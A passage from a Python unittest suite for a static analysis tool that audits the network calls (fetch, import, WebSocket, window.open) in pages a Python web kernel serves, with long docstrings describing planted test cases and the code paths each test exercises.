        self.assertTrue(m, "the settings page's template is scanned: the beacon lists\n" + gates(out))
        n = int(m.group(1))
        self.assertTrue(self.at["settings_def"] < n <= self.at["settings_anchor"], "listed at the template's own lines (%d, def %d, anchor %d)" % (n, self.at["settings_def"], self.at["settings_anchor"]))
        self.assertIn("kernel/kernel.py:%d" % n, unclassified(out))

    def test_a_route_the_extraction_cannot_read_is_refused_by_name(self):
        self.assertRefused(self.rc, self.out, "SERVED kernel/kernel.py:%d reads ui/probe.html for a served page, a file the walk does not scan" % self.at["probe_read"],
                           "SERVED kernel/kernel.py:%d serves text/html from body, text the census did not read" % self.at["body_param"])

    def test_an_f_string_page_is_read_and_a_format_slot_url_is_the_computed_class(self):
        out = self.out
        self.assertIn("kernel/kernel.py:%d" % self.at["fstring"], unclassified(out), "the f-string branch: its literal parts are pieces")
        self.assertListed(out, r"kernel/kernel\.py:%d  fetch  fetch\('%%s'\)  in -  -> \(browser-computed-url\)$" % self.at["slot"],
                          "a URL filled at serve time is computed, never local by its spelling")
        self.assertNotIn("kernel/kernel.py:%d" % self.at["slot"], unclassified(out))

    def test_a_second_socket_or_opener_in_the_served_text_moves_its_rowed_keys_count(self):
        expected = _expected()
        for key in ("kernel/kernel.py:WebSocket", "kernel/kernel.py:window.open"):
            self.assertIn(key, expected["per_key"], "the served text's rowed tools are counted keys (the shim's and the shell's sockets, the boot's opener)")
        self.assertRefused(self.rc, self.out,
                           "COUNTS per_key kernel/kernel.py:WebSocket: the committed count is %d, this run found %d" % (expected["per_key"]["kernel/kernel.py:WebSocket"], expected["per_key"]["kernel/kernel.py:WebSocket"] + 1),
                           "COUNTS per_key kernel/kernel.py:window.open: the committed count is %d, this run found %d" % (expected["per_key"]["kernel/kernel.py:window.open"], expected["per_key"]["kernel/kernel.py:window.open"] + 1))

    def test_the_import_gate_over_served_text_reads_import_led_lines_and_not_a_brace_led_one(self):
        out = self.out
        self.assertRefused(self.rc, out, "IMPORT kernel/kernel.py:%d imports example-pkg" % self.at["import"])
        self.assertNotIn("IMPORT kernel/kernel.py:%d " % self.at["alert"], out, "a brace-led line with `from` in a string is any block's last line in a page's script, not an import")

    def test_a_brace_led_line_is_read_in_served_text_only_where_it_continues_an_import_statement(self):
        """Since the sixth round, over served text a line led by `from` or a closing brace is read as a statement's `from` line only
        where it continues an import or export statement that begins its own line and has not yet ended. The boot's split import
        (`import {`, `y`, `} from 'example-split-pkg';`) is gated at its brace-led line, silent at the sixth round's head; a brace-led line with `from` in a string after an export statement that ended on its own line (`export
        const q = 1;`) is any block's last line, and no line. The arms whose removal reds each: the continuation state for the
        first, and the state's end at a statement's `;` for the second (the export then left open, the alert's `from '+q+'` read)."""
        out = self.out
        self.assertRefused(self.rc, out, "IMPORT kernel/kernel.py:%d imports example-split-pkg" % self.at["split_import"])
        self.assertNotIn("IMPORT kernel/kernel.py:%d " % self.at["alert_after_export"], out,
                         "after an export statement that ended on its line, a brace-led line is any block's last line, not an import")

    def test_served_text_keeps_its_gate_and_the_two_named_shapes_are_its_residual(self):
        """The seventh round's review widened the gate's reads in walked files only; served text keeps SERVED_IMPORT_GATE, and the
        pin that holds the walked files to a TypeScript parse does not parse it (UNREAD_BINDINGS states the residual for served text
        alone). The two shapes the residual names on their own, planted in the boot script, are held at their outcome, no line: a
        continuation line led by a name (`  z2 } from 'example-name-pkg';`, which a walked file reads) and a comment between `from`
        and the specifier (`import w from /* c */ 'example-comment-pkg';`, which neither the gate nor the binding patterns read), so
        both packages, outside KNOWN_JS_IMPORTS, pass the gate. Were the widening to reach served text, the first would be an IMPORT
        line."""
        out = self.out
        for name, pkg in (("served_name_led", "example-name-pkg"), ("served_comment", "example-comment-pkg")):
            self.assertNotIn("IMPORT kernel/kernel.py:%d " % self.at[name], out, "served text's residual: %s is no gate line" % name)
            self.assertNotIn(" imports %s," % pkg, out, "served text's residual: %s passes the gate" % pkg)

    def assertFetchUnclassifiedAt(self, n, tag, why, rel=KERNEL_PATH):
        """A plant page's fetch (FGH_PAGE with `tag`) is named on the UNCLASSIFIED line at line n of the planted file (kernel.py,
        or since the seventh round a probe module, `rel`) and listed at that line with no road."""
        self.assertIn("%s:%d" % (rel, n), unclassified(self.out), "%s: the page's fetch is UNCLASSIFIED at %s:%d\n%s" % (why, rel, n, gates(self.out)))
        self.assertListed(self.out, r"^%s:%d  fetch  fetch\('https://example\.invalid/%s'\)  in -  -> UNCLASSIFIED$" % (re.escape(rel), n, re.escape(tag)), why)

    def test_a_routes_type_is_read_through_a_constant_a_keyword_a_local_and_every_script_running_type(self):
        """F of the fifth round, a route's content type: each plant is a do_GET branch, and since the fifth round a `_send`
        call's type is read through the parameter Handler._send's Content-Type line names, module constants and locals, cut at
        `;`, stripped, lower-cased and compared with SCRIPT_TYPES. F1 (a module constant's type), F2 (ctype=), F3 (Text/HTML;
        Charset=UTF-8), F4 (image/svg+xml), F5 (application/xhtml+xml), F6 (application/javascript) and F8 (a local's type)
        each list their page's fetch UNCLASSIFIED at its own line; F7 (a Content-Type header written outside _send), F9 (a
        body read from a file the walk does not scan, under a module constant's type) and F10 (a type a function returns) are
        each a SERVED line at their own line. The arm whose removal reds each: the module-constant read of _ctype_values for
        F1 and F9 (a SERVED line for a type the census cannot resolve in place of the listing or the file's line), the keyword
        read for F2 and the local read for F8 (that SERVED line in place of the listing), the essence's normalization for F3
        and the type list for F4 to F6 (each page silent), the judging of a Content-Type written outside _send for F7 and the
        refusal of an unresolved type for F10 (each silent). The reviewed head, whose routes were `_send` calls with a
        text/html or text/javascript literal, prints none of these lines."""
        for plant, tag in FGH_TYPED:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the route's type is read and runs script: its page is scanned")
        for plant, tag, line in FGH_TYPE_REFUSED:
            with self.subTest(plant=plant):
                self.assertRefused(self.rc, self.out, line % self.at[tag])

    def test_the_allowlist_names_an_entry_that_names_nothing_and_a_new_place_under_an_entrys_key(self):
        """The served allowlist's two gates (F of the fifth round). F11 respells the one place the Handler._file_slice entry
        covers, its type argument `ctype`, as the literal "application/json", one of the two types _slice_body returns: the
        entry names nothing and the stale-entry gate's line names it, and the respelled place, now a type that runs no script,
        is passed with no line of its own (asserted too, so the plant accounts for everything it prints). Of the entries that
        cover one place, this respelling prints the fewest lines: do_OPTIONS's or _ws's bodiless answer respelled adds a SERVED
        line for an answer with no Content-Type, and a memo's, the relay's or the names registry's respelled adds a SERVED line
        for its container or read, while _file_slice's place, once spelled, resolves and is passed. F12 is a do_GET branch whose
        type is `ct + "; charset=utf-8"`, the /dist and /media entry's key: the entry excuses the route (no line names it, its
        page unread), and the count gate names the third place under a key that covers two. The arm whose removal reds each:
        the stale-entry gate for F11 and the count gate for F12, each then silent. The reviewed head has no allowlist, so
        neither line is printed there."""
        out, at = self.out, self.at
        with self.subTest(plant="F11 an allowlist entry that names nothing"):
            self.assertRefused(self.rc, out, "SERVED ALLOW %s %r names nothing this run reads" % SLICE_KEY)
            self.assertIsNone(re.search(r"kernel/kernel\.py:%d(?!\d)" % at["slice"], out),
                              "the respelled place resolves to application/json and is passed: no line names it\n" + gates(out))
        with self.subTest(plant="F12 a third place under the /dist and /media entry's key"):
            self.assertRefused(self.rc, out, "SERVED ALLOW %s %r covers %d places, the entry says %d" % (DIST_KEY + (DIST_PLACES + 1, DIST_PLACES)))
            self.assertIsNone(re.search(r"kernel/kernel\.py:%d(?!\d)" % at["f12"], out),
                              "the key excuses the route and its page is not read: the count gate is the one line that names it\n" + gates(out))

    def test_a_page_is_read_through_encode_format_map_its_containers_and_class_attributes(self):
        """G of the fifth round, the receivers and containers a page's text is read through. G1 (.encode on a function's
        return), G1b (.encode on a module constant), G2 (.get with a default on a module dict), G3 (a module dict's subscript
        joined with a literal), G4 (.format_map on a module constant), G4b (.format_map on a function's return), G5 (a class
        attribute), G6 (a subscript of a module dict that holds a number too), G9 (.get, .strip and .encode on a module dict)
        and G15 (two functions each binding a local named body, the page's fetch in the second's) each list their page's fetch
        UNCLASSIFIED at the line that holds it; G7 and G10 (a receiver a function returns, one and two calls deep), G11 (a
        receiver a method returns) and G8 (a module container a function writes at run time) are each a SERVED line at the
        route. The arm whose removal reds each: the follow of .encode and .format_map for G1 and G4b (a SERVED line for the
        function's return in its place) and for G10, whose line names the receiver inside its .encode (without the follow
        the line names the whole chain), that follow and the name read together for G1b and G4 (either alone keeps them
        read), the name read for G2, G3, G6 and G9, the class-attribute read for G5, the refusal of a receiver the pass does
        not read for G7, G10 and G11 (each then silent), the memo rule for G8, and holding each function's map of locals for
        the whole pass for G15 (without it a later map can take a freed map's id and the second function's local is skipped,
        which happens on 3.10 and the free-threaded 3.14 and not on 3.11 or 3.12). At the reviewed head G15 is caught or
        silent by interpreter as that says, and the others print none of these lines."""
        for plant, tag in FGH_READ:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the page's text is read through its receiver or container")
        for plant, tag, line in FGH_REFUSED:
            with self.subTest(plant=plant):
                self.assertRefused(self.rc, self.out, line % self.at[tag])

    def test_served_text_is_read_per_match_with_no_comment_skip_each_site_at_its_parts_line(self):
        """H of the fifth round, how served text is read per line. H1 adds a third-party fetch after the local fetches of the
        drift banner's joined script (_RDRIFT_JS), UNCLASSIFIED at the constant's first line (the line after `_RDRIFT_JS = (`,
        the one-line rule for a joined constant); H2 leads the banner's joined stylesheet (_RDRIFT_CSS) with a `*{` part that
        carries a page's fetch, UNCLASSIFIED at that line; H4 serves a line with a literal import( and then a computed one,
        the second listed as the computed class, the import() key's count going from none to one and the computed class's
        count moved by it and the format slot (SERVED_COMPUTED_PLANTS), each figure from the committed counts; H5 puts a
        fetch in a multi-line f-string's later part, UNCLASSIFIED at the fetch's own line and not at the f-string's first;
        H6 serves two identical parts on different lines, each UNCLASSIFIED at its own line and both listed; H7 serves two
        identical constants on one line, both sites. The arm whose removal reds each: reading every fetch( and import( on a
        line by its own argument for H1 and H4 (each silent), dropping the comment skip over served text for H2 (silent), each
        part's own line for H5 and H6 (H5 listed one line early, at the f-string's first line; H6's second part listed at the
        first part's line), and the dedupe keyed on the part rather than its line and text for H7 (one site). The reviewed
        head is silent on H1, H2 and H4, lists H5 one line early and lists H6 and H7 once. Beside them the residual
        SERVED_LINE_RESIDUAL states, held by three plants at the line each is listed at: R1, a `}` on a later line than its
        expression, and R2, a literal after a formatted value on the next line, each listed at its own line on 3.12 and later
        and one line early on 3.10 and 3.11 (the reviewed head listed both early everywhere); R3, text joined across two
        literals, listed at the first literal's line on every interpreter."""
        out, at = self.out, self.at
        with self.subTest(plant="H1 a fetch after local ones in a joined constant"):
            self.assertFetchUnclassifiedAt(at["drift_js"] + 1, "h1", "every fetch( on the joined constant's one line is read, at its first line")
        with self.subTest(plant="H2 a joined constant led by *{"):
            self.assertFetchUnclassifiedAt(at["h2"], "h2", "served text has no comment skip: a part led by *{ is read")
        with self.subTest(plant="H4 a second, computed import( on a line"):
            self.assertListed(out, r"^kernel/kernel\.py:%d  import\(\)  import\(location\.hash\.slice\(1\)\)  in -  -> \(browser-computed-url\)$" % at["h4"],
                              "every import( on a line is read by its own argument")
            expected = _expected()
            imports, computed = expected["per_key"].get("kernel/kernel.py:import()"), expected["classes"]["browser-computed-url"]
            self.assertRefused(self.rc, out,
                               "COUNTS per_key kernel/kernel.py:import(): the committed count is %s, this run found %d" % (imports, (imports or 0) + 1),
                               "COUNTS classes browser-computed-url: the committed count is %d, this run found %d" % (computed, computed + len(SERVED_COMPUTED_PLANTS)))
        with self.subTest(plant="H5 a site in a multi-line f-string's later part"):
            self.assertFetchUnclassifiedAt(at["h5"], "h5", "a part's site at the part's own line")
            self.assertNotIn("kernel/kernel.py:%d" % at["h5_open"], unclassified(out), "not one line early, at the f-string's first line")
        with self.subTest(plant="H6 two identical parts on different lines"):
            for key in ("h6_first", "h6_second"):
                self.assertFetchUnclassifiedAt(at[key], "h6", "each identical part at its own line")
            listed = [ln for ln in out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("h6") in ln]
            self.assertEqual(len(listed), 2, "both parts are sites, each counted once: %r" % listed)
        with self.subTest(plant="H7 two identical constants on one line"):
            self.assertFetchUnclassifiedAt(at["h7"], "h7", "the line's pieces are read")
            listed = [ln for ln in out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("h7") in ln]
            self.assertEqual(len(listed), 2, "the dedupe is keyed on the part, not its line and text, so both constants are sites: %r" % listed)
        # the residual SERVED_LINE_RESIDUAL states, each plant holding the line it is listed at (the ruling's residual plants)
        late = sys.version_info >= (3, 12)
        with self.subTest(plant="R1 a closing brace on a later line than its expression"):
            n, early = (at["r1"], at["r1_open"]) if late else (at["r1_open"], at["r1"])
            self.assertFetchUnclassifiedAt(n, "r1", "listed at the part's own line on 3.12 and later, at the expression's line on 3.10 and 3.11")
            self.assertNotIn("kernel/kernel.py:%d" % early, unclassified(out))
        with self.subTest(plant="R2 a literal after a formatted value on the next line"):
            n, early = (at["r2"], at["r2_value"]) if late else (at["r2_value"], at["r2"])
            self.assertFetchUnclassifiedAt(n, "r2", "listed at the literal's own line on 3.12 and later, at the formatted value's line on 3.10 and 3.11")
            self.assertNotIn("kernel/kernel.py:%d" % early, unclassified(out))
        with self.subTest(plant="R3 text merged across concatenated literals"):
            self.assertFetchUnclassifiedAt(at["r3_open"], "r3", "a site in text joined across literals is listed at the first part's line")
            self.assertNotIn("kernel/kernel.py:%d" % at["r3"], unclassified(out), "on every interpreter")

    def test_a_route_typed_through_a_written_name_an_unread_body_or_a_send_reference_is_refused_by_name(self):
        """B of the sixth round, the served routes' refusals (correctness-1, correctness-3, correctness-5), each a SERVED line at
        the plant's own line. B1: a route typed through a module name the module writes after binding it resolves to no type: a dict
        constant a module-level subscript store rewrites (c1s), a constant a function rebinds under `global` by an assignment (c1g),
        a dict constant a dunder mutator writes (wsi, `__setitem__`), a dict constant a container type's method names as its first
        argument (wdu, `dict.update`; wco, `collections.OrderedDict.update`), and a type constant a function binds under `global` by
        an import (gti), a from-import (gtf), a def (gtd), a class statement (gtc) and an except clause (gte), the written names
        routes_of threads through _ctype_values and _dict_of. B2: a script-running route whose body the census does not read at the
        call's second positional argument: a body passed by keyword (c3k), a starred argument before the body (c3s) and a `**`
        spread (c3d); the keyword body's page is no site (refused, not read). (The definition whose one write names its third
        parameter, c3p, and the class with two `_send` definitions, tsd, are probe modules of their own since the seventh round,
        held in test_a_send_definition_the_census_does_not_read_whole_refuses_its_routes_by_name: a second `_send` in
        kernel/kernel.py would refuse every route of that file, and tsd is refused there as a `_send` bound more than once.) B3:
        a reference to `_send` that is no call the scan reads: an alias of the bound method (c5a), a bare `_send` read (c5n), a
        getattr naming it (c5g), and a string equal to `_send` (srb `builtins.getattr`, sra
        `operator.attrgetter`, srg `__getattribute__`, srv a key of `vars()`). The arm whose removal reds each: the written names
        for c1s and c1g, the dunder mutators for wsi, the container type's first argument for wdu and wco, and the binding under
        `global` recorded for an import (gti), a from-import (gtf), a def or class statement (gtd and gtc) and an except clause
        (gte), each plant then typed by its literal, application/json, and silent; the call's positional check for c3k (the run then
        dies with an IndexError, the defect at the sixth round's head),
        c3s and c3d (each then read at the call's second argument, its page's fetch UNCLASSIFIED); and the attribute and bare-name
        reads of `_send` for c5a and c5n, the getattr read for c5g and the string's read for srb to srv (each silent). At the sixth
        round's head c3s and c3d are read at call.args[1] (each page's fetch UNCLASSIFIED), c3k crashes the run, and every other
        plant is silent."""
        for plant, tag, line in BC_ROUTE_REFUSED:
            with self.subTest(plant=plant):
                self.assertRefused(self.rc, self.out, line % self.at[tag])
        listed = [ln for ln in self.out.splitlines() if SITE_LINE.match(ln) and _fgh_mark("c3k") in ln]
        self.assertEqual(listed, [], "the keyword body is refused, not read: its page is no site")

    def test_a_page_text_past_the_constants_and_the_followed_calls_is_refused_by_name(self):
        """C of the sixth round, the served text's refusals (correctness-2, extra6-2), each a SERVED line at the plant's own line.
        C1: the served pass's constants are the names one plain single-name assignment binds as a top-level statement and nothing
        else binds at module level (_module_consts), and a bare module name that is no constant passes only as an import, a function
        or a class that is its
        name's one module-level binding, or a builtin no module-level binding shadows, and in each case only when nothing rebinds
        the name (no function binds it under `global` and no statement at module level writes it; a write through a function's local
        of the same name does not count): a name bound only inside a module-level try (c2t) and a builtin-named name bound inside a
        try (bit), each bound once and not by a top-level statement, are refused as "a module name bound once inside a module-level
        block, not by a top-level statement" (since the seventh round's review; the sixth round's reason, "a module name bound other
        than by one assignment", was false for a name one assignment binds); a name one top-level annotated (c1a), unpacking (c1u)
        or chained (c1c) assignment binds, bound once and no constant, is refused as "a module name bound by an annotated, unpacking
        or chained assignment, which the census does not read as a constant" (since the seventh round's review; the reason before,
        "a module name bound other than by one assignment", was false for them); a default rebound inside a try (c2d), an import
        rebound
        by an assignment (rbi), a def rebound by one (rbd), an import a function rebinds under `global` (gri), a builtin so rebound
        (grb) and an import a statement at module level writes (grm) are each refused as "a module name bound other than by one
        assignment"; a rebound import called (rbk), a rebound def
        called (rbc) and a def a function rebinds under `global`, called (grd), none a function the pass follows, and a
        builtin-named module constant called (bic) are refused as "a call"; an import a function writes only through a local of its
        own (grl) keeps its exemption and is no line; and the route typing reads the same constants, so a type constant bound again
        under a module-level if (c2ct) is a type the census cannot resolve. C2: a call whose callee the pass does not follow passes
        only as an import, a builtin or a parameter, and any other is refused as "a call": a module-constant lambda (x6l), a module
        constant aliasing a function (x6a), functools.partial through a module constant (x6p), an instance read through a module
        constant (x6i, refused at the constant's own line, where its value calls the class), a subscript dispatch (x6s), a callee
        that is itself a call (x6c), a class (x6k) and a local-bound callee (x6o). A list and a set constant a container type's
        method writes (wla `list.append`, wsa `set.add`) are containers the module writes, refused where a page reads them. The arm
        whose removal reds each: the Name arm's classification for c2t and c2d, the block-body reason in _Served._module_why for c2t
        and bit (the sixth round's reason again), its assignment-form reason for c1a, c1u and c1c, and the count's record of those
        forms (each the sixth round's reason again), the one-binding count for c2d and c2ct (c2d then
        read as its default, c2ct typed text/plain), the refusal of any other callee for x6l to x6k, and _base's local-bound callee
        for x6o (the local then passed as a name the body binds); the one-binding check on an import in _base's name arm for rbi and
        in its call arm for rbk, on a function for rbd and on a followed module function for rbc; the builtin check after the
        module's bindings in _base's call arm for bic and in its name arm for bit; the rebind check in _Served._sole for gri, grd
        and grm and in _Served._builtin for grb, and a write by a statement at module level recorded as a rebind for grm (each then
        silent, since each page's literal part is a piece); and the container type's first argument for wla and wsa. A write through
        a function's local recorded as a rebind reds grl. At the sixth round's head rbi and rbd are read (each page's fetch
        UNCLASSIFIED) and every other plant is silent; at the reviewed head c1a, c1u and c1c are refused with the sixth round's
        reason."""
        for plant, tag, line in BC_TEXT_REFUSED:
            with self.subTest(plant=plant):
                self.assertRefused(self.rc, self.out, line % self.at[tag])
        self.assertEqual([ln for ln in self.out.splitlines() if "_PROBE_GRL" in ln], [],
                         "an import whose name a function writes only through a local of its own (grl) keeps its exemption: no line")

    def assertARefused(self, groups):
        """Each A_REFUSED plant of the groups (the label's leading `(a)` and so on) is its SERVED line at the fix, at its tag's line."""
        for plant, tag, line in A_REFUSED:
            if plant.split(" ", 1)[0] in groups:
                with self.subTest(plant=plant):
                    self.assertRefused(self.rc, self.out, line % self.at[tag])

    def test_a_module_name_a_header_walrus_a_star_import_or_a_block_binds_is_refused_by_name(self):
        """A of the seventh round, the one-binding count and _Served's module names (correctness-1, extra9-1, extra9-3), each a
        SERVED line at the plant's own line. (a) A walrus in a module-level def's or class's header binds the module's name: a
        def's decorator, a positional default, a keyword-only default, an argument's annotation, the *args and the **kwargs
        annotation, the return annotation, a class's decorator, base and keyword, and a def inside a module-level if, each
        beside the name's one assignment, refused as "a module name bound other than by one assignment", and a class keyword's
        walrus beside a type constant's assignment, a type the census cannot resolve (hct). (b) Under `from .pages import *`
        (relative, so no IMPORT line), in a probe module of its own: a page constant, a followed def and a builtin, each refused
        as "a module name a star import may rebind", a type constant unresolved, and a bare `_send` call refused by the same
        reason (bsc). (e) An import, a def and a class bound once inside a module-level block are refused with the reason naming
        the block, as a receiver (er), a callee (ec), a bare name (eb) and a def called as a followed function (ed); and a module
        name no module-level statement binds, which only a function binds under a `global` declaration, is refused with a reason
        saying so, not with the reasonless line, whatever form binds it there: an assignment (xgo), a match capture (xgm), a star
        capture (xgs) or a match mapping's rest (xgr), each in a probe module of its own since the seventh round's review. A
        module constant a function rebinds by a match capture under the declaration is a container the module writes at run
        time, as one an assignment there rebinds is (xgc).
        At the reviewed head every (a) and (b) plant is silent (the constant's first assignment read, the def followed, the builtin
        exempt, the type application/json) but bsc, whose page is read, and every (e) plant is refused with another reason or
        none (er "a module name bound other than by one assignment", ec and ed "a call", eb, xgo, xgm, xgs and xgr no reason) but
        xgc, whose constant is read (its fetch listed). The arm whose removal
        reds each: the count's walk of a header for every (a) plant, and each part of _header for its own plants (decorators for
        hdd, positional defaults for hdp and hif, keyword-only defaults for hdk, the arguments' annotations for hda, the *args
        annotation for hdv, the **kwargs annotation for hdw, the return annotation for hdr, a class's decorators, bases and
        keywords for hcd, hcb, and hck and hct; the parts are shared with (c), whose plants red under the part each uses,
        positional defaults for cnd, cnl, ctd and ctl and bases for cnc and ctc); the empty constant map under a star import for
        bsp and bst, the star checks in _Served._sole for bsf and in _Served._builtin for bsb, and routes_of's for bsc;
        _module_why's block arm for er, ec, eb and ed, and _Served's names from the count's walk for eb (the reasonless line
        again); for xgo, resolve's reading of a name only a global declaration binds (the reasonless line again) and _module_why's
        arm for it (then "a module name bound other than by one assignment"); and Scan's record of a match capture bound under the
        declaration (Result.rebinds), the capture's for xgm, xgs and xgc, the star capture's for xgs and the mapping's rest's for
        xgr (xgm, xgs and xgr then the reasonless line, xgc's constant read)."""
        self.assertARefused(("(a)", "(b)", "(e)"))

    def test_a_name_the_page_functions_scope_binds_is_decided_by_that_scope(self):
        """A of the seventh round, the function-scope readers (correctness-1's function scope, correctness-2, and the rulings on a
        parameter or an except name as a callee, a name bound two ways and a comprehension's target). (c) A walrus in a nested
        def's default, a nested class's base or a lambda's default inside a page function binds that function's name:
        _Served._locals reads it as a local with its value, so its page's fetch is listed UNCLASSIFIED at the walrus's line and
        the module constant beside it is not read (cnd, cnc, cnl), and inside do_GET the same walrus leaves a route's type
        unresolved (_scopes_of: ctd, ctc, ctl). (d) A callee, a bare name or a receiver the page function's scope binds is
        decided by that scope, never by the module's binding: a callee a local assignment, a loop target, a with target or a
        comprehension target binds, or a local reached through the text-method arm, is refused as "a call" (dl, dt, dw, dq, dx);
        a parameter and an except name sharing a module function's name are refused as such (dp, de); a function-level import
        and a nested class are refused by their form (di, dc), and so is a function-level import shadowing a module constant as
        a bare name and as a receiver (db, dv); a nested def rebound by an assignment is a name bound two ways (dr); a del, a
        nonlocal declaration, a match capture, a comprehension's target read outside its comprehension and a name an annotation
        alone makes local refuse (dd, dn, dm, dk, ds); a `global` declaration names the module's binding, here a container the
        function writes, refused as one (dg); a parameter callee that shares no module function's name stays a value slot with
        no line (dpn); and a local sharing a module import's name, called as a receiver base (`json = lambda ...` and then
        `json("t").get("k")`, in a probe module of its own whose `json` import nothing rebinds), is refused as "a call" by
        _base's own scope check (dj), the lambda's text never scanned; and a receiver base that is a call of super() is refused by
        name (wspg, since the seventh round's review: `super().page()`, whose method is a base class's page text,
        which a builtin's exemption passed). No module function's page, and no module constant a scope shadows, is scanned. At the
        reviewed head wspg and every (c) plant are silent (each (c) plant's module constant read), and of (d) the callees sharing a
        module function's name follow
        that function (its page's fetch listed at its own line), db, dv, dd, dm, dk and ds read the module constant, and dr, dg
        and dn are silent. The arm whose removal reds each: the header read in _Served._locals for cnd, cnc and cnl and in
        _scopes_of for ctd, ctc and ctl; _scoped's refusal of a local callee for dl, dt, dw, dq and dx; its refusal of a
        parameter or an except name sharing a module function's name for dp and de, and the name's being a module function's for
        dpn; the import form recorded for di, db and dv, the class form for dc, the one-binding condition on a followed nested
        def for dr, the global declaration recorded for dg, the del for dd, the nonlocal declaration a nested function holds for
        dn, the match capture for dm, the comprehension's target for dk and any other store for ds; and _base's scope check in
        its Call arm for dj, which the reviewed head refuses as "a call" too (without the check the module's `json` import is
        exempt and the base passes with no line); and _base's refusal of a super() call for wspg (then exempt as a builtin's call,
        silent)."""
        self.assertARefused(("(c)", "(d)"))
        for plant, tag, rel in A_READ[:3]:
            with self.subTest(plant=plant):
                self.assertFetchUnclassifiedAt(self.at[tag], tag, "the walrus's value is read as a local and its text scanned", rel)
        with self.subTest(plant="(d) a parameter's callee sharing no module function's name"):
            self.assertEqual([ln for ln in self.out.splitlines() if "_probe_dpn" in ln], [], "a value slot, as the table keeps it: no line")

    def test_a_send_definition_the_census_does_not_read_whole_refuses_its_routes_by_name(self):
        """A of the seventh round, routes_of and _body_param (correctness-3, extra5-2, extra5-1), each plant a probe module of its
        own, each a SERVED line at the call's line. (f) A `_send` carrying any decorator refuses, since its parameters are not
        read, at both reaches: a staticmethod, a keyword-only staticmethod and a classmethod reached through self, and a
        decorated module function reached by a bare call. (g) A file that binds `_send` more than once outside function bodies
        (the module and every class body counted together, a class body a function body defines included, since a class body
        is no function body), or other than by one def statement direct in a class body or the module, refuses every `_send`
        call in it: a def inside an if, a try and a with, in a class body and at module level, a def followed by an assignment,
        a subclass overriding `_send` in the same file, two direct defs in one class (the sixth round's tsd plant), as the one
        binding a def inside an if and an assignment, two defs in a class a function body defines beside a module-level def
        (gnc), a subclass a function body defines overriding `_send` in the same file (lfb), an import binding `_send` in the
        class body after its def (gip) and a walrus binding it in a module-level def's default (ghw); and, since the seventh round's
        review, a file where a function binds `_send` under a `global` declaration, rebinding the module's name at
        run time, refuses every `_send` call in it with a reason naming the function and the binding: by an import beside a
        module-level def (wglb), by a def statement with none (vglc), and by an assignment in a method whose own bare call it is
        (bfg). A comprehension's target named `_send` binds only in its comprehension, so a file whose one direct def is beside
        one in a class body (ygcp) or at module level (ygcm) is read, its page's fetch listed. A file that names `_send`
        nowhere but as its calls' called name keeps the true reason, a definition this file does not hold (zsb, a subclass of
        another file's class; a call that reaches no definition the census reads in a file that names `_send` besides is the (r)
        case's), and a factory's class,
        defined in a function body with its one direct def, is read (fac, its page's
        fetch listed). (h) A definition that writes anything besides its page parameter refuses with the road
        named: a second write of an expression, writelines, a sendall on the connection ("a second write"), an alias of the
        write or of sendall ("a write through an alias"), a getattr naming write or sendall ("a write method named by a
        string"), a print to the stream, json.dump into the request's file, shutil.copyfileobj into the stream, a helper handed
        self or the request, a builtin the module rebinds and a method on a parameter the definition rebinds to the socket ("a
        call the reader does not read"), a second reference to the stream, a definition that writes nothing, one whose one write
        is a sendall, and a module-level `_send` calling a second method on its handler parameter; and, since the seventh round's
        review, len, str or isinstance bound inside the definition by an import, a def or class statement, a parameter of a lambda
        or a def nested in it (a positional parameter, a keyword-only one or `*args`), a match capture, a match mapping's rest, an
        except name or a del, and a method on a parameter the definition rebinds by an import, a def statement, a lambda's parameter
        or a nested def's `**kwargs` ("a call the reader does not read": the builtin is then the definition's own name, and the
        parameter holds no value built from parameters), and self bound again inside the definition by an assignment (hya), a
        lambda's parameter (hyl), an import (hyi) or, on 3.12 and later, a class statement's type parameter (hyt), each with a
        header call on it but hyi, which takes a getattr of it ("a definition that rebinds self"), or declared global in a class
        body nested in it, with a header call there (hyg, "a definition that declares self global"): the call could reach an
        object other than the handler. Beside them the sixth round's
        c3p keeps its reason in a probe module of its own. At the reviewed head the staticmethod, the (g) plants with an earlier
        def and every (h) road are typed or read (silent, or the page's fetch listed while the other written text is never
        scanned), the keyword-only staticmethod is refused with a false reason, the classmethod and the decorated module
        function are read, tsd is typed through its last def, and the two (g) plants whose one binding is no direct def say the
        file holds no definition; gnc is typed through its class's last def and read, lfb, gip and ghw are read, zsb has the
        true reason it has here, and fac is read; wglb is silent (typed through the module's def, application/json), vglc and bfg
        say the file holds no definition, ygcp and ygcm are read, and the (h) roads the seventh round's review added for len, str,
        isinstance, a rebound parameter and a rebound or global self are read. The arm whose removal reds each: the decorator
        refusal for (f); the file's binding check for (g), its count for tsd and gsc and its def-statement condition for gio and
        gao; the count's reach into
        a function body's class statements for gnc and lfb, its import form for gip and its walk of a def's header for ghw; the
        pass for a file with no binding for zsb (then the (g) line, whose reason presupposes a binding the file does not have);
        for fac the reach and that pass together, either of which reads it (with both removed it is the (g) line); the refusal of
        a file whose `_send` a function rebinds under a `global` declaration for wglb, vglc and bfg (then wglb typed and silent, vglc
        the no-scope reason and bfg the reason naming its method's binding), and _global_binder's condition that the declaring
        body binds the name for bgs (the (r) case's, then refused); _send_bindings's leaving a comprehension's targets to it for
        ygcp and ygcm (each then the (g) line); for (h) the string arm for hga and hgs,
        the alias arm for hal and hsl, the second-write arm for hw2, hwl and hsa, the print's reason for hpr, the refusal of any
        other call for hpr, hjd, hcf, hhs, hhr, hbs, hpb and hmh, the receiver arm for hrr, the builtin's module binding for
        hbs, a rebound parameter's values for hpb, the stream's own name for hmh, the no-write reason for hnw and the single
        write's method for hso; and _body_param's record of the other binding forms, each form's arm for its plants (the def and
        class statements for hbd, hbc and hpd, the import for hbi and hpi, the except name and the match capture for hbe and hbm
        (one arm), the match mapping's rest for hbr, the del for hbx and a nested def's or lambda's parameter, of every kind, for
        hla, hls, hdl, hdi, hpl and hpk; and its record of a parameter so rebound for hpi, hpd, hpl and hpk; each then read, its
        page's fetch listed); and _body_param's refusal of a definition that rebinds self for hya, hyl, hyi and hyt (its store
        arm for hya, its other forms' for hyl and hyi, its type parameters' for hyt) and of one that declares it global for hyg
        (each then read, its page's fetch listed)."""
        self.assertARefused(("(f)", "(g)", "(h)", "B2"))
        for plant, tag, rel in A_G_READ:
            with self.subTest(plant=plant):
